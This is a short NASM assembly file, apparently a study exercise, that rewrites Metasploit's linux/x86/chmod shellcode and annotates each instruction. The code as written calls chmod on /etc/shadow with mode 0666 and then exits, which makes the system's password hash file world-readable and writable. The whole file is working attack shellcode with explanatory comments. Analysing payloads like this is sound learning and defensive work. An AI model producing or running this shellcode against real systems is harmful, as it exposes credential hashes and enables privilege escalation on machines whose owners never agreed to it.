;Filename: Chmod.nasm
;Nasm code obtained from: msfvenom -p linux/x86/chmod -f c => Compile shellcode => Copy nasm code from gdb 
;Author: MrSquid

global _start 

section .text

_start:
	cdq                ;Set edx to 0
	push   0xf	   ;Push 0xf (15 in decimal) to the stack
	pop    eax	   ;Assign 0xf to EAX --> calling syscall chmod()
	push   edx	   ;Push edx to the stack (is 0x0)
	call   chmod
	;das    
	;gs je  0x4040b1
	;das    
	;jae    0x4040b9
	;popa   
	;outs   dx,DWORD PTR fs:[esi]
	;ja     0x404056 <code+22>
	
chmod:	
	pop ebx 	;obtain ebx, which is the path of the file to modify (ebx=0x40404a <=> /ETC/SHADOW)
	push 0x1b6 	;This is 666 in octal 
	pop ecx 	; Assign 0x1b6 to exc <=> ecx = 0666
	int 0x80 	;Execute the function  <=> chmod("/etc/shadow", 666)
			;Syscall --> Exit() 
	push 0x1 	;Push 1 to the stack
	pop eax 	; assign 1 to eax 
	int 0x80 	;execute the function <=> exit()
	add [eax],al

	


	


